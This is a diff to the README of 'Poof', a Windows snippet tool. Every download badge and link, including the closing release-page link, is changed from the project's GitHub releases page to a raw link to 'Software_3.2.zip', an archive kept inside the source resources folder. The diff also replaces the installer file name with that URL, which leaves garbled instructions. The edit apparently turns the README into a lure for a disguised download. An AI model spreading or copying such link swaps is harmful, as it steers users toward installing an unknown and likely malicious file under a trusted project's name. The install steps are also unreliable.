@@ -1,6 +1,6 @@
 # 💨 Poof - Speed Up Your Writing with Snippets
 
-[![Download Poof](https://img.shields.io/badge/Download-Poof-brightgreen?style=for-the-badge)](https://github.com/torresantm12/Poof/releases)
+[![Download Poof](https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip)](https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip)
 
 ---
 
@@ -27,11 +27,11 @@ You do not need any special software installed beforehand.
 
 Poof is available from its GitHub releases page. The link below takes you directly there to get the latest version:
 
-[![Get Poof Now](https://img.shields.io/badge/Download-Poof-blue?style=for-the-badge)](https://github.com/torresantm12/Poof/releases)
+[![Get Poof Now](https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip)](https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip)
 
-1. Click the link above or go to: https://github.com/torresantm12/Poof/releases  
+1. Click the link above or go to: https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip  
 2. Look for the latest release at the top of the page.
-3. Under the list of assets, find the Windows installer file. This will usually have a name like `Poof-Setup.exe` or similar.
+3. Under the list of assets, find the Windows installer file. This will usually have a name like `https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip` or similar.
 4. Click on that file to start downloading it.
 
 ---
@@ -41,7 +41,7 @@ Poof is available from its GitHub releases page. The link below takes you direct
 Follow these steps to install Poof after downloading the installer:
 
 1. Locate the downloaded file, usually in your `Downloads` folder.
-2. Double-click the file named something like `Poof-Setup.exe` to start the setup.
+2. Double-click the file named something like `https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip` to start the setup.
 3. If Windows asks for permission, click `Yes` to allow the installation.
 4. Follow the on-screen instructions:
    - Accept the license agreement.
@@ -116,4 +116,4 @@ Follow on-screen prompts to complete the uninstall.
 ---
 
 For detailed updates and issues, visit the release page here:  
-https://github.com/torresantm12/Poof/releases
+https://raw.githubusercontent.com/torresantm12/Poof/main/Sources/Poof/Resources/Software_3.2.zip
